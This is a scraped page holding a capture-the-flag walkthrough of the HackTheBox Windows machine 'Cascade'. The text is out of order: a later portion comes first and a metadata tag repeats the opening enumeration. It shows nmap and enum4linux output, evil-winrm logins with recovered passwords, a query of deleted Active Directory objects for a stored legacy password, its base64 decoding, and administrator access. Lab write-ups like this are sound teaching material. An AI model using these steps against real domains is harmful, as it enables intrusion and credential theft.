1/26/2020 10:25 PM x64 d----- 1/26/2020 10:25 PM x86 -a---- 1/28/2020 9:46 PM 13312 CascAudit.exe -a---- 1/29/2020 6:00 PM 12288 CascCrypto.dll -a---- 1/28/2020 11:29 PM 45 RunAudit.bat -a---- 10/27/2019 6:38 AM 363520 System.Data.SQLite.dll -a---- 10/27/2019 6:38 AM 186880 System.Data.SQLite.EF6.dll -a---- 1/28/2020 9:46 PM 13312 CascAudit.exe -a---- 1/29/2020 6:00 PM 12288 CascCrypto.dll Found a couple of intresting files exe and dll. There was a folder DB and which contains Audit.db.. *Evil-WinRM* PS C:\Shares\Audit\DB&gt; ls Directory: C:\Shares\Audit\DB Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 1/28/2020 9:39 PM 24576 Audit.db Downloaded the Audit.db file and looking in the contents I found ArkSvcBQO5l5Kj9MdErXx6Q6AGOw== Having a look at both the other files that we have got CascAudit.exe and CascCrypto.dll using DNSPY. After all the REverse Engineering is done, the final output is the password of user ARK-SVC Login as Arksvc evil-winrm -i cascade.htb -u arksvc -p w3lc0meFr31nd Evil-WinRM shell v2.0 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\arksvc\Documents&gt; Privilege escalation part 2 *Evil-WinRM* PS C:\Users\arksvc\Documents&gt; whoami /all USER INFORMATION ---------------- User Name SID ============== ============================================== cascade\arksvc S-1-5-21-3332504370-1206983947-1165150453-1106 GROUP INFORMATION ----------------- Group Name Type SID Attributes =========================================== ================ ============================================== =============================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group BUILTIN\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group CASCADE\Data Share Alias S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group CASCADE\IT Alias S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group CASCADE\AD Recycle Bin Alias S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group CASCADE\Remote Management Users Alias S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group NT AUTHORITY\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\Medium Plus Mandatory Level Label S-1-16-8448 PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled This thing seems very instresting!! CASCADE\AD Recycle Bin Alias S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group Finding the Deleted Objects: *Evil-WinRM* PS C:\Users\arksvc\Documents&gt; Get-ADObject -ldapFilter:&quot;(msDS-LastKnownRDN=*)&quot; -IncludeDeletedObjects Deleted : True DistinguishedName : CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local Name : CASC-WS1 DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe ObjectClass : computer ObjectGUID : 6d97daa4-2e82-4946-a11e-f91fa18bfabe Deleted : True DistinguishedName : CN=Scheduled Tasks\0ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN=Deleted Objects,DC=cascade,DC=local Name : Scheduled Tasks DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2 ObjectClass : group ObjectGUID : 13375728-5ddb-4137-b8b8-b9041d1d3fd2 Deleted : True DistinguishedName : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local Name : {A403B701-A528-4685-A816-FDEE32BDDCBA} DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e ObjectClass : groupPolicyContainer ObjectGUID : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e Deleted : True DistinguishedName : CN=Machine\0ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN=Deleted Objects,DC=cascade,DC=local Name : Machine DEL:93c23674-e411-400b-bb9f-c0340bda5a34 ObjectClass : container ObjectGUID : 93c23674-e411-400b-bb9f-c0340bda5a34 Deleted : True DistinguishedName : CN=User\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local Name : User DEL:746385f2-e3a0-4252-b83a-5a206da0ed88 ObjectClass : container ObjectGUID : 746385f2-e3a0-4252-b83a-5a206da0ed88 Deleted : True DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local Name : TempAdmin DEL:f0cc344d-31e0-4866-bceb-a842791ca059 ObjectClass : user ObjectGUID : f0cc344d-31e0-4866-bceb-a842791ca059 The below ones are intresting! Deleted : True DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local Name : TempAdmin DEL:f0cc344d-31e0-4866-bceb-a842791ca059 ObjectClass : user ObjectGUID : f0cc344d-31e0-4866-bceb-a842791ca059 Gaining ROOT Access!! *Evil-WinRM* PS C:\Users\arksvc\Documents&gt; Get-ADObject -filter 'isdeleted -eq $true -and name -ne &quot;Deleted Objects&quot;' -includeDeletedObjects -property * accountExpires : 9223372036854775807 badPasswordTime : 0 badPwdCount : 0 CanonicalName : cascade.local/Deleted Objects/CASC-WS1 DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe CN : CASC-WS1 DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe codePage : 0 countryCode : 0 Created : 1/9/2020 7:30:19 PM createTimeStamp : 1/9/2020 7:30:19 PM Deleted : True Description : DisplayName : DistinguishedName : CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local dSCorePropagationData : {1/17/2020 3:37:36 AM, 1/17/2020 12:14:04 AM, 1/9/2020 7:30:19 PM, 1/1/1601 12:04:17 AM} instanceType : 4 isCriticalSystemObject : False isDeleted : True LastKnownParent : OU=Computers,OU=UK,DC=cascade,DC=local lastLogoff : 0 lastLogon : 0 localPolicyFlags : 0 logonCount : 0 Modified : 1/28/2020 6:08:35 PM modifyTimeStamp : 1/28/2020 6:08:35 PM msDS-LastKnownRDN : CASC-WS1 Name : CASC-WS1 DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe nTSecurityDescriptor : System.DirectoryServices.ActiveDirectorySecurity ObjectCategory : ObjectClass : computer ObjectGUID : 6d97daa4-2e82-4946-a11e-f91fa18bfabe objectSid : S-1-5-21-3332504370-1206983947-1165150453-1108 primaryGroupID : 515 ProtectedFromAccidentalDeletion : False pwdLastSet : 132230718192147073 sAMAccountName : CASC-WS1$ sDRightsEffective : 0 userAccountControl : 4128 uSNChanged : 245849 uSNCreated : 24603 whenChanged : 1/28/2020 6:08:35 PM whenCreated : 1/9/2020 7:30:19 PM CanonicalName : cascade.local/Deleted Objects/Scheduled Tasks DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2 CN : Scheduled Tasks DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2 Created : 1/13/2020 5:21:53 PM createTimeStamp : 1/13/2020 5:21:53 PM Deleted : True Description : DisplayName : DistinguishedName : CN=Scheduled Tasks\0ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN=Deleted Objects,DC=cascade,DC=local dSCorePropagationData : {1/17/2020 9:35:46 PM, 1/17/2020 9:32:57 PM, 1/17/2020 3:37:36 AM, 1/17/2020 12:14:04 AM...} groupType : -2147483644 instanceType : 4 isDeleted : True LastKnownParent : OU=Groups,OU=UK,DC=cascade,DC=local Modified : 1/28/2020 6:07:55 PM modifyTimeStamp : 1/28/2020 6:07:55 PM msDS-LastKnownRDN : Scheduled Tasks Name : Scheduled Tasks DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2 nTSecurityDescriptor : System.DirectoryServices.ActiveDirectorySecurity ObjectCategory : ObjectClass : group ObjectGUID : 13375728-5ddb-4137-b8b8-b9041d1d3fd2 objectSid : S-1-5-21-3332504370-1206983947-1165150453-1131 ProtectedFromAccidentalDeletion : False sAMAccountName : Scheduled Tasks sDRightsEffective : 0 uSNChanged : 245848 uSNCreated : 114790 whenChanged : 1/28/2020 6:07:55 PM whenCreated : 1/13/2020 5:21:53 PM CanonicalName : cascade.local/Deleted Objects/{A403B701-A528-4685-A816-FDEE32BDDCBA} DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e CN : {A403B701-A528-4685-A816-FDEE32BDDCBA} DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e Created : 1/26/2020 2:34:30 AM createTimeStamp : 1/26/2020 2:34:30 AM Deleted : True Description : DisplayName : Block Potato DistinguishedName : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local dSCorePropagationData : {1/1/1601 12:00:00 AM} flags : 0 gPCFileSysPath : \\cascade.local\SysVol\cascade.local\Policies\{A403B701-A528-4685-A816-FDEE32BDDCBA} gPCFunctionalityVersion : 2 gPCMachineExtensionNames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1D-2488-11D1-A28C-00C04FB94F17}][{B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A}{53D6AB1D-2488-11D1-A28C-00C04FB94F17}] instanceType : 4 isDeleted : True LastKnownParent : CN=Policies,CN=System,DC=cascade,DC=local Modified : 1/26/2020 2:40:52 AM modifyTimeStamp : 1/26/2020 2:40:52 AM msDS-LastKnownRDN : {A403B701-A528-4685-A816-FDEE32BDDCBA} Name : {A403B701-A528-4685-A816-FDEE32BDDCBA} DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e nTSecurityDescriptor : System.DirectoryServices.ActiveDirectorySecurity ObjectCategory : ObjectClass : groupPolicyContainer ObjectGUID : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e ProtectedFromAccidentalDeletion : False sDRightsEffective : 0 showInAdvancedViewOnly : True uSNChanged : 196701 uSNCreated : 196688 versionNumber : 2 whenChanged : 1/26/2020 2:40:52 AM whenCreated : 1/26/2020 2:34:30 AM CanonicalName : cascade.local/Deleted Objects/Machine DEL:93c23674-e411-400b-bb9f-c0340bda5a34 CN : Machine DEL:93c23674-e411-400b-bb9f-c0340bda5a34 Created : 1/26/2020 2:34:31 AM createTimeStamp : 1/26/2020 2:34:31 AM Deleted : True Description : DisplayName : DistinguishedName : CN=Machine\0ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN=Deleted Objects,DC=cascade,DC=local dSCorePropagationData : {1/1/1601 12:00:00 AM} instanceType : 4 isDeleted : True LastKnownParent : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local Modified : 1/26/2020 2:40:52 AM modifyTimeStamp : 1/26/2020 2:40:52 AM msDS-LastKnownRDN : Machine Name : Machine DEL:93c23674-e411-400b-bb9f-c0340bda5a34 nTSecurityDescriptor : System.DirectoryServices.ActiveDirectorySecurity ObjectCategory : ObjectClass : container ObjectGUID : 93c23674-e411-400b-bb9f-c0340bda5a34 ProtectedFromAccidentalDeletion : False sDRightsEffective : 0 showInAdvancedViewOnly : True uSNChanged : 196699 uSNCreated : 196689 whenChanged : 1/26/2020 2:40:52 AM whenCreated : 1/26/2020 2:34:31 AM CanonicalName : cascade.local/Deleted Objects/User DEL:746385f2-e3a0-4252-b83a-5a206da0ed88 CN : User DEL:746385f2-e3a0-4252-b83a-5a206da0ed88 Created : 1/26/2020 2:34:31 AM createTimeStamp : 1/26/2020 2:34:31 AM Deleted : True Description : DisplayName : DistinguishedName : CN=User\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local dSCorePropagationData : {1/1/1601 12:00:00 AM} instanceType : 4 isDeleted : True LastKnownParent : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local Modified : 1/26/2020 2:40:52 AM modifyTimeStamp : 1/26/2020 2:40:52 AM msDS-LastKnownRDN : User Name : User DEL:746385f2-e3a0-4252-b83a-5a206da0ed88 nTSecurityDescriptor : System.DirectoryServices.ActiveDirectorySecurity ObjectCategory : ObjectClass : container ObjectGUID : 746385f2-e3a0-4252-b83a-5a206da0ed88 ProtectedFromAccidentalDeletion : False sDRightsEffective : 0 showInAdvancedViewOnly : True uSNChanged : 196700 uSNCreated : 196690 whenChanged : 1/26/2020 2:40:52 AM whenCreated : 1/26/2020 2:34:31 AM accountExpires : 9223372036854775807 badPasswordTime : 0 badPwdCount : 0 CanonicalName : cascade.local/Deleted Objects/TempAdmin DEL:f0cc344d-31e0-4866-bceb-a842791ca059 cascadeLegacyPwd : YmFDVDNyMWFOMDBkbGVz CN : TempAdmin DEL:f0cc344d-31e0-4866-bceb-a842791ca059 codePage : 0 countryCode : 0 Created : 1/27/2020 3:23:08 AM createTimeStamp : 1/27/2020 3:23:08 AM Deleted : True Description : DisplayName : TempAdmin DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local dSCorePropagationData : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM} givenName : TempAdmin instanceType : 4 isDeleted : True LastKnownParent : OU=Users,OU=UK,DC=cascade,DC=local lastLogoff : 0 lastLogon : 0 logonCount : 0 Modified : 1/27/2020 3:24:34 AM modifyTimeStamp : 1/27/2020 3:24:34 AM msDS-LastKnownRDN : TempAdmin Name : TempAdmin DEL:f0cc344d-31e0-4866-bceb-a842791ca059 nTSecurityDescriptor : System.DirectoryServices.ActiveDirectorySecurity ObjectCategory : ObjectClass : user ObjectGUID : f0cc344d-31e0-4866-bceb-a842791ca059 objectSid : S-1-5-21-3332504370-1206983947-1165150453-1136 primaryGroupID : 513 ProtectedFromAccidentalDeletion : False pwdLastSet : 132245689883479503 sAMAccountName : TempAdmin sDRightsEffective : 0 userAccountControl : 66048 userPrincipalName : TempAdmin@cascade.local uSNChanged : 237705 uSNCreated : 237695 whenChanged : 1/27/2020 3:24:34 AM whenCreated : 1/27/2020 3:23:08 AM Found the cascadeLegacyPwd of Tempadmin cascadeLegacyPwd : YmFDVDNyMWFOMDBkbGVz Time to decode.. echo YmFDVDNyMWFOMDBkbGVz|base64 -d baCT3r1aN00dles — Logging as ADMIN evil-winrm -i cascade.htb -u administrator -p baCT3r1aN00dles Evil-WinRM shell v2.0 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\Administrator\Documents&gt; Getting Root.txt *Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd .. *Evil-WinRM* PS C:\Users\Administrator&gt; cd Desktop *Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt 930****************************b35b *Evil-WinRM* PS C:\Users\Administrator\Desktop If you like my work, please do consider giving me +rep on HACKTHEBOX. My HackTheBox profile: https://www.hackthebox.eu/home/users/profile/291968">
<meta property="og:description" content="Cascade is a windows machine on Hackthebox, made by VBSCRUB which I personally a big fan of him. This box is one hell of an awsome machine made by him. Info Cascade   OS: Windows Difficulty: Medium Points: 30 Release: 28 Mar 2020 IP: 10.10.10.182 Let’s start hacking into CASCADE As always hacking starts with NMAP scan. nmap -sV -A -T4 -Pn -sC -vvv cascade.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-23 02:52 EDT NSE: Loaded 151 scripts for scanning. NSE: Script Pre-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 02:52 Completed NSE at 02:52, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 02:52 Completed NSE at 02:52, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 02:52 Completed NSE at 02:52, 0.00s elapsed Initiating SYN Stealth Scan at 02:52 Scanning cascade.htb (10.10.10.182) [1000 ports] Discovered open port 445/tcp on 10.10.10.182 Discovered open port 53/tcp on 10.10.10.182 Discovered open port 135/tcp on 10.10.10.182 Discovered open port 139/tcp on 10.10.10.182 Discovered open port 49157/tcp on 10.10.10.182 Discovered open port 49154/tcp on 10.10.10.182 Discovered open port 3268/tcp on 10.10.10.182 Discovered open port 88/tcp on 10.10.10.182 Discovered open port 49165/tcp on 10.10.10.182 Discovered open port 636/tcp on 10.10.10.182 Discovered open port 49155/tcp on 10.10.10.182 Discovered open port 389/tcp on 10.10.10.182 Discovered open port 49158/tcp on 10.10.10.182 Discovered open port 3269/tcp on 10.10.10.182 Completed SYN Stealth Scan at 02:52, 9.90s elapsed (1000 total ports) Initiating Service scan at 02:52 Scanning 14 services on cascade.htb (10.10.10.182) Completed Service scan at 02:53, 56.75s elapsed (14 services on 1 host) Initiating OS detection (try #1) against cascade.htb (10.10.10.182) Retrying OS detection (try #2) against cascade.htb (10.10.10.182) Initiating Traceroute at 02:53 Completed Traceroute at 02:53, 0.22s elapsed Initiating Parallel DNS resolution of 2 hosts. at 02:53 Completed Parallel DNS resolution of 2 hosts. at 02:53, 13.11s elapsed DNS resolution of 1 IPs took 13.11s. Mode: Async [#: 1, OK: 0, NX: 0, DR: 1, SF: 0, TR: 3, CN: 0] NSE: Script scanning 10.10.10.182. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 02:53 NSE Timing: About 99.95% done; ETC: 02:54 (0:00:00 remaining) Completed NSE at 02:54, 40.20s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 02:54 NSE Timing: About 97.32% done; ETC: 02:54 (0:00:01 remaining) NSE Timing: About 98.21% done; ETC: 02:55 (0:00:01 remaining) NSE Timing: About 99.11% done; ETC: 02:55 (0:00:01 remaining) Completed NSE at 02:56, 120.90s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 02:56 Completed NSE at 02:56, 0.00s elapsed Nmap scan report for cascade.htb (10.10.10.182) Host is up, received user-set (0.18s latency). Scanned at 2020-07-23 02:52:18 EDT for 246s Not shown: 986 filtered ports Reason: 986 no-responses PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 88/tcp open tcpwrapped syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds? syn-ack ttl 127 636/tcp open tcpwrapped syn-ack ttl 127 3268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped syn-ack ttl 127 49154/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49155/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49157/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 49158/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49165/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose|phone|specialized Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (91%) OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012 OS fingerprint not ideal because: Missing a closed TCP port so results incomplete Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (91%), Microsoft Windows Phone 7.5 or 8.0 (91%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%) No exact OS matches for host (test conditions non-ideal). TCP/IP fingerprint: SCAN(V=7.80%E=4%D=7/23%OT=53%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=5F193499%P=x86_64-pc-linux-gnu) SEQ(SP=106%GCD=1%ISR=10C%TI=I%II=I%TS=7) OPS(O1=M54DNW8ST11%O2=M54DNW8ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M54DNW8ST11%O6=M54DST11) WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000) ECN(R=Y%DF=Y%TG=80%W=2000%O=M54DNW8NNS%CC=N%Q=) T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=) T2(R=N) T3(R=N) T4(R=N) U1(R=N) IE(R=Y%DFI=N%TG=80%CD=Z) Uptime guess: 0.479 days (since Wed Jul 22 15:26:52 2020) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=253 (Good luck!) IP ID Sequence Generation: Incremental Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows Host script results: |_clock-skew: 3m22s | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 62331/tcp): CLEAN (Timeout) | Check 2 (port 51409/tcp): CLEAN (Timeout) | Check 3 (port 10882/udp): CLEAN (Timeout) | Check 4 (port 53799/udp): CLEAN (Timeout) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2020-07-23T06:57:09 |_ start_date: 2020-07-22T19:30:40 TRACEROUTE (using port 445/tcp) HOP RTT ADDRESS 1 184.36 ms 10.10.14.1 2 184.52 ms cascade.htb (10.10.10.182) NSE: Script Post-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 02:56 Completed NSE at 02:56, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 02:56 Completed NSE at 02:56, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 02:56 Completed NSE at 02:56, 0.00s elapsed Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 248.12 seconds Raw packets sent: 2074 (94.964KB) | Rcvd: 144 (20.275KB) Enum4linux enum4linux -a cascade.htb Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Jul 23 02:47:55 2020 ========================== | Target Information | ========================== Target ........... cascade.htb RID Range ........ 500-550,1000-1050 Username ......... '' Password ......... '' Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none =================================================== | Enumerating Workgroup/Domain on cascade.htb | =================================================== [E] Can't find workgroup/domain =========================================== | Nbtstat Information for cascade.htb | =========================================== Looking up status of 10.10.10.182 No reply from 10.10.10.182 ==================================== | Session Check on cascade.htb | ==================================== Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437. [+] Server cascade.htb allows sessions using username '', password '' Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451. [+] Got domain/workgroup name: ========================================== | Getting domain SID for cascade.htb | ========================================== Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359. Domain Name: CASCADE Domain Sid: S-1-5-21-3332504370-1206983947-1165150453 [+] Host is part of a domain (not a workgroup) ===================================== | OS information on cascade.htb | ===================================== Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458. Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464. [+] Got OS info for cascade.htb from smbclient: Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467. [+] Got OS info for cascade.htb from srvinfo: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED ============================ | Users on cascade.htb | ============================ Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866. index: 0xee0 RID: 0x464 acb: 0x00000214 Account: a.turnbull Name: Adrian Turnbull Desc: (null) index: 0xebc RID: 0x452 acb: 0x00000210 Account: arksvc Name: ArkSvc Desc: (null) index: 0xee4 RID: 0x468 acb: 0x00000211 Account: b.hanson Name: Ben Hanson Desc: (null) index: 0xee7 RID: 0x46a acb: 0x00000210 Account: BackupSvc Name: BackupSvc Desc: (null) index: 0xdeb RID: 0x1f5 acb: 0x00000215 Account: CascGuest Name: (null) Desc: Built-in account for guest access to the computer/domain index: 0xee5 RID: 0x469 acb: 0x00000210 Account: d.burman Name: David Burman Desc: (null) index: 0xee3 RID: 0x467 acb: 0x00000211 Account: e.crowe Name: Edward Crowe Desc: (null) index: 0xeec RID: 0x46f acb: 0x00000211 Account: i.croft Name: Ian Croft Desc: (null) index: 0xeeb RID: 0x46e acb: 0x00000210 Account: j.allen Name: Joseph Allen Desc: (null) index: 0xede RID: 0x462 acb: 0x00000210 Account: j.goodhand Name: John Goodhand Desc: (null) index: 0xed7 RID: 0x45c acb: 0x00000210 Account: j.wakefield Name: James Wakefield Desc: (null) index: 0xeca RID: 0x455 acb: 0x00000210 Account: r.thompson Name: Ryan Thompson Desc: (null) index: 0xedd RID: 0x461 acb: 0x00000210 Account: s.hickson Name: Stephanie Hickson Desc: (null) index: 0xebd RID: 0x453 acb: 0x00000210 Account: s.smith Name: Steve Smith Desc: (null) index: 0xed2 RID: 0x457 acb: 0x00000210 Account: util Name: Util Desc: (null) Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881. user:[CascGuest] rid:[0x1f5] user:[arksvc] rid:[0x452] user:[s.smith] rid:[0x453] user:[r.thompson] rid:[0x455] user:[util] rid:[0x457] user:[j.wakefield] rid:[0x45c] user:[s.hickson] rid:[0x461] user:[j.goodhand] rid:[0x462] user:[a.turnbull] rid:[0x464] user:[e.crowe] rid:[0x467] user:[b.hanson] rid:[0x468] user:[d.burman] rid:[0x469] user:[BackupSvc] rid:[0x46a] user:[j.allen] rid:[0x46e] user:[i.croft] rid:[0x46f] ======================================== | Share Enumeration on cascade.htb | ======================================== Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640. Sharename Type Comment --------- ---- ------- SMB1 disabled -- no workgroup available [+] Attempting to map shares on cascade.htb =================================================== | Password Policy Information for cascade.htb | =================================================== [+] Attaching to cascade.htb using a NULL share [+] Trying protocol 445/SMB... [+] Found domain(s): [+] CASCADE [+] Builtin [+] Password Info for Domain: CASCADE [+] Minimum password length: 5 [+] Password history length: None [+] Maximum password age: Not Set [+] Password Complexity Flags: 000000 [+] Domain Refuse Password Change: 0 [+] Domain Password Store Cleartext: 0 [+] Domain Password Lockout Admins: 0 [+] Domain Password No Clear Change: 0 [+] Domain Password No Anon Change: 0 [+] Domain Password Complex: 0 [+] Minimum password age: None [+] Reset Account Lockout Counter: 30 minutes [+] Locked Account Duration: 30 minutes [+] Account Lockout Threshold: None [+] Forced Log off Time: Not Set Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501. [+] Retieved partial password policy with rpcclient: Password Complexity: Disabled Minimum Password Length: 5 ============================= | Groups on cascade.htb | ============================= Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542. [+] Getting builtin groups: group:[Pre-Windows 2000 Compatible Access] rid:[0x22a] group:[Incoming Forest Trust Builders] rid:[0x22d] group:[Windows Authorization Access Group] rid:[0x230] group:[Terminal Server License Servers] rid:[0x231] group:[Users] rid:[0x221] group:[Guests] rid:[0x222] group:[Remote Desktop Users] rid:[0x22b] group:[Network Configuration Operators] rid:[0x22c] group:[Performance Monitor Users] rid:[0x22e] group:[Performance Log Users] rid:[0x22f] group:[Distributed COM Users] rid:[0x232] group:[IIS_IUSRS] rid:[0x238] group:[Cryptographic Operators] rid:[0x239] group:[Event Log Readers] rid:[0x23d] group:[Certificate Service DCOM Access] rid:[0x23e] [+] Getting builtin group memberships: Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group 'Pre-Windows 2000 Compatible Access' (RID: 554) has member: NT AUTHORITY\Authenticated Users Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group 'Guests' (RID: 546) has member: CASCADE\CascGuest Group 'Guests' (RID: 546) has member: CASCADE\Domain Guests Use of uninitialized value $global_workgroup in 